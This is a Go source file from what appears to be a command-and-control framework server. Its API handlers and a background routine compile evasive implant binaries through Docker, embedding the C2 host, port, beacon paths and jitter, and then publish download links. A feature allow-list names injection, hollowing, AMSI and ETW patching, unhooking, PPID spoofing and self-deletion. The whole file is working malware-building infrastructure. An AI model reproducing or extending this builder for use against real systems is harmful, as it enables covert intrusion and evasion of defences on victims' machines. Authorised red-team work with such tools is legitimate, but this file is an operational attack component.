package api

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/db"
	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/storage"
	"github.com/google/uuid"
	"go.uber.org/zap"
)

type buildView struct {
	ID          string     `json:"id"`
	CampaignID  string     `json:"campaign_id,omitempty"`
	Status      string     `json:"status"`
	TargetOS    string     `json:"target_os"`
	TargetArch  string     `json:"target_arch"`
	ArtifactURL string     `json:"artifact_url,omitempty"`
	SHA256      string     `json:"sha256,omitempty"`
	CreatedAt   time.Time  `json:"created_at"`
	CompletedAt *time.Time `json:"completed_at,omitempty"`
}

func (g *gateway) handleCreateBuild(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Config struct {
			CampaignID   string `json:"campaign_id"`
			ListenerID   string `json:"listener_id"`
			ProfileName  string `json:"profile_name"`
			TargetOS     string `json:"target_os"`
			TargetArch   string `json:"target_arch"`
			SleepSeconds int      `json:"sleep_seconds"`
			JitterPct    int      `json:"jitter_pct"`
			Ephemeral    bool     `json:"ephemeral"`
			SleepEncrypt bool     `json:"sleep_encrypt"`
			Features     []string `json:"features"`
		} `json:"config"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeError(w, http.StatusBadRequest, "invalid body")
		return
	}

	cfg := req.Config
	if cfg.SleepSeconds == 0 {
		cfg.SleepSeconds = 30
	}
	if cfg.JitterPct == 0 {
		cfg.JitterPct = 20
	}
	if cfg.TargetOS == "" {
		cfg.TargetOS = "windows"
	}
	if cfg.TargetArch == "" {
		cfg.TargetArch = "x64"
	}

	// Resolve listener host/port from DB
	listenerHost := "host.docker.internal"
	listenerPort := 4443
	if cfg.ListenerID != "" {
		var host string
		var port int
		err := db.Pool.QueryRow(r.Context(),
			`SELECT bind_host, bind_port FROM listeners WHERE id = $1`, cfg.ListenerID,
		).Scan(&host, &port)
		if err == nil {
			listenerHost = host
			listenerPort = port
		}
	}

	operatorID := operatorIDFromCtx(r.Context())
	buildUUID := uuid.New().String()

	var campaignID *string
	if cfg.CampaignID != "" && cfg.CampaignID != "00000000-0000-0000-0000-000000000000" {
		campaignID = &cfg.CampaignID
	}

	evasionFlags := fmt.Sprintf(`{"ephemeral":%v}`, cfg.Ephemeral)

	var b buildView
	err := db.Pool.QueryRow(r.Context(), `
		INSERT INTO builds (campaign_id, operator_id, target_os, target_arch,
		                    listener_id, sleep_seconds, jitter_pct, evasion_flags, ephemeral, build_uuid)
		VALUES ($1, $2, $3, $4, $5, $6, $7, $8::jsonb, $9, $10)
		RETURNING id, COALESCE(campaign_id::text,''), status, target_os, target_arch,
		          COALESCE(artifact_url,''), COALESCE(sha256,''), created_at, completed_at`,
		campaignID, operatorID, cfg.TargetOS, cfg.TargetArch,
		nilIfEmpty(cfg.ListenerID), cfg.SleepSeconds, cfg.JitterPct,
		evasionFlags, cfg.Ephemeral, buildUUID,
	).Scan(&b.ID, &b.CampaignID, &b.Status, &b.TargetOS, &b.TargetArch,
		&b.ArtifactURL, &b.SHA256, &b.CreatedAt, &b.CompletedAt)
	if err != nil {
		g.log.Error("create build record", zap.Error(err))
		writeError(w, http.StatusInternalServerError, "create failed")
		return
	}

	// Kick off the build in the background
	go g.runBuild(b.ID, buildUUID, cfg.CampaignID, listenerHost, strconv.Itoa(listenerPort),
		cfg.TargetOS, cfg.TargetArch, cfg.ProfileName, cfg.SleepSeconds, cfg.JitterPct, cfg.SleepEncrypt, cfg.Features)

	writeJSON(w, http.StatusCreated, b)
}

func (g *gateway) handleGetBuild(w http.ResponseWriter, r *http.Request) {
	var b buildView
	err := db.Pool.QueryRow(r.Context(), `
		SELECT id, COALESCE(campaign_id::text,''), status, target_os, target_arch,
		       COALESCE(artifact_url,''), COALESCE(sha256,''), created_at, completed_at
		FROM builds WHERE id = $1`, r.PathValue("id"),
	).Scan(&b.ID, &b.CampaignID, &b.Status, &b.TargetOS, &b.TargetArch,
		&b.ArtifactURL, &b.SHA256, &b.CreatedAt, &b.CompletedAt)
	if err != nil {
		writeError(w, http.StatusNotFound, "build not found")
		return
	}
	writeJSON(w, http.StatusOK, b)
}

func (g *gateway) handleListBuilds(w http.ResponseWriter, r *http.Request) {
	campaignID := r.URL.Query().Get("campaign_id")

	query := `
		SELECT id, COALESCE(campaign_id::text,''), status, target_os, target_arch,
		       COALESCE(artifact_url,''), COALESCE(sha256,''), created_at, completed_at
		FROM builds WHERE 1=1`
	args := []any{}
	n := 1
	if campaignID != "" {
		query += fmt.Sprintf(" AND campaign_id = $%d", n)
		args = append(args, campaignID)
		n++
	}
	query += " ORDER BY created_at DESC LIMIT 50"

	rows, err := db.Pool.Query(r.Context(), query, args...)
	if err != nil {
		g.log.Error("list builds", zap.Error(err))
		writeError(w, http.StatusInternalServerError, "list failed")
		return
	}
	defer rows.Close()

	var out []buildView
	for rows.Next() {
		var b buildView
		if err := rows.Scan(&b.ID, &b.CampaignID, &b.Status, &b.TargetOS, &b.TargetArch,
			&b.ArtifactURL, &b.SHA256, &b.CreatedAt, &b.CompletedAt); err != nil {
			writeError(w, http.StatusInternalServerError, "scan failed")
			return
		}
		out = append(out, b)
	}
	if out == nil {
		out = []buildView{}
	}
	writeJSON(w, http.StatusOK, out)
}

// runBuild executes the Docker build in a background goroutine and updates the build record.
func (g *gateway) runBuild(buildID, buildUUID, campaignID, c2Host, c2Port,
	targetOS, targetArch, profileName string, sleepSecs, jitterPct int, sleepEncrypt bool, features []string) {

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Minute)
	defer cancel()

	setBuildStatus := func(status string, artifactURL, sha256 string) {
		_, err := db.Pool.Exec(context.Background(), `
			UPDATE builds SET status = $2, artifact_url = NULLIF($3,''), sha256 = NULLIF($4,''), completed_at = NOW()
			WHERE id = $1`, buildID, status, artifactURL, sha256)
		if err != nil {
			g.log.Error("update build status", zap.String("build_id", buildID), zap.Error(err))
		}
	}

	_, _ = db.Pool.Exec(context.Background(), `UPDATE builds SET status = 'building' WHERE id = $1`, buildID)

	// Resolve cross-compile target and artifact names from TargetOS/TargetArch
	cargoTarget, binName, ext := resolveTarget(targetOS, targetArch)

	// Resolve malleable profile fields (paths, user-agent)
	regPath, pollPath, userAgent := "/r", "/c", ""
	if profileName != "" {
		var ua, rp, pp string
		err := db.Pool.QueryRow(ctx,
			`SELECT user_agent, register_path, poll_path FROM c2_profiles WHERE name = $1`, profileName,
		).Scan(&ua, &rp, &pp)
		if err == nil {
			userAgent, regPath, pollPath = ua, rp, pp
		} else {
			g.log.Warn("profile not found, using defaults", zap.String("profile", profileName))
		}
	}

	imageTag := "dm-agent-build-" + buildID

	sleepEncryptStr := "false"
	if sleepEncrypt {
		sleepEncryptStr = "true"
	}

	featuresArg := ""
	if len(features) > 0 {
		allowed := map[string]bool{
			"inject-classic": true, "inject-apc": true, "inject-hollow": true,
			"inject-hijack": true, "inject-stomp": true, "unhook": true,
			"etw-patch": true, "amsi-patch": true, "ppid-spoof": true,
			"heap-encrypt": true, "stack-spoof": true, "udrl": true, "staged-payload": true,
			"self-delete": true, "channel-tcp": true, "channel-smb": true,
			"sleep-encrypt": true,
		}
		var validated []string
		for _, f := range features {
			if allowed[f] {
				validated = append(validated, f)
			}
		}
		if len(validated) > 0 {
			featuresArg = strings.Join(validated, ",")
		}
	}

	buildArgs := []string{
		"build",
		"-f", "/workspace/deploy/docker/Dockerfile.agent",
		"--build-arg", "DM_TARGET=" + cargoTarget,
		"--build-arg", "DM_BIN=" + binName,
		"--build-arg", "DM_C2_HOST=" + c2Host,
		"--build-arg", "DM_C2_PORT=" + c2Port,
		"--build-arg", "DM_C2_PATH_REG=" + regPath,
		"--build-arg", "DM_C2_PATH_POLL=" + pollPath,
		"--build-arg", "DM_SLEEP_SECS=" + strconv.Itoa(sleepSecs),
		"--build-arg", "DM_JITTER_PCT=" + strconv.Itoa(jitterPct),
		"--build-arg", "DM_BUILD_UUID=" + buildUUID,
		"--build-arg", "DM_TLS_SKIP_VERIFY=false",
		"--build-arg", "DM_NO_EVASION=false",
		"--build-arg", "DM_UA=" + userAgent,
		"--build-arg", "DM_SLEEP_ENCRYPT=" + sleepEncryptStr,
		"--build-arg", "DM_FEATURES=" + featuresArg,
	}
	if campaignID != "" && campaignID != "00000000-0000-0000-0000-000000000000" {
		buildArgs = append(buildArgs, "--build-arg", "DM_CAMPAIGN_ID="+campaignID)
	}
	buildArgs = append(buildArgs, "-t", imageTag, "/workspace")

	buildCmd := exec.CommandContext(ctx, "docker", buildArgs...)
	buildCmd.Stdout = os.Stdout
	buildCmd.Stderr = os.Stderr
	if err := buildCmd.Run(); err != nil {
		g.log.Error("docker build failed", zap.String("build_id", buildID), zap.Error(err))
		setBuildStatus("failed", "", "")
		return
	}

	buildVolume := os.Getenv("DM_BUILD_VOLUME")
	if buildVolume == "" {
		buildVolume = "dungeonmaster_build_artifacts"
	}
	outPath := "/artifacts/" + buildID + ext
	extractCmd := exec.CommandContext(ctx,
		"docker", "run", "--rm",
		"-v", buildVolume+":/out",
		imageTag, "sh", "-c", "cp /"+binName+" /out/"+buildID+ext,
	)
	if err := extractCmd.Run(); err != nil {
		g.log.Error("docker extract failed", zap.String("build_id", buildID), zap.Error(err))
		setBuildStatus("failed", "", "")
		return
	}

	exec.Command("docker", "rmi", imageTag).Run() //nolint

	contentType := "application/octet-stream"
	if ext == ".exe" {
		contentType = "application/vnd.microsoft.portable-executable"
	}

	artifactURL, err := storage.UploadFile(ctx, storage.BucketArtifacts, buildID+ext, outPath, contentType)
	if err != nil {
		g.log.Error("minio upload failed", zap.String("build_id", buildID), zap.Error(err))
		setBuildStatus("failed", "", "")
		return
	}

	downloadURL, _ := storage.PresignedDownloadURL(ctx, storage.BucketArtifacts, buildID+ext)
	if downloadURL == "" {
		downloadURL = artifactURL
	}

	setBuildStatus("complete", downloadURL, "")
	g.log.Info("build complete", zap.String("build_id", buildID), zap.String("url", downloadURL))

	os.Remove(outPath)
}

// resolveTarget maps UI target_os/target_arch to Cargo triple, binary name, and file extension.
func resolveTarget(targetOS, targetArch string) (cargoTarget, binName, ext string) {
	switch targetOS {
	case "linux":
		switch targetArch {
		default:
			return "x86_64-unknown-linux-musl", "dm-agent", ""
		}
	default: // windows
		return "x86_64-pc-windows-gnu", "dm-agent.exe", ".exe"
	}
}

func nilIfEmpty(s string) *string {
	if s == "" {
		return nil
	}
	return &s
}
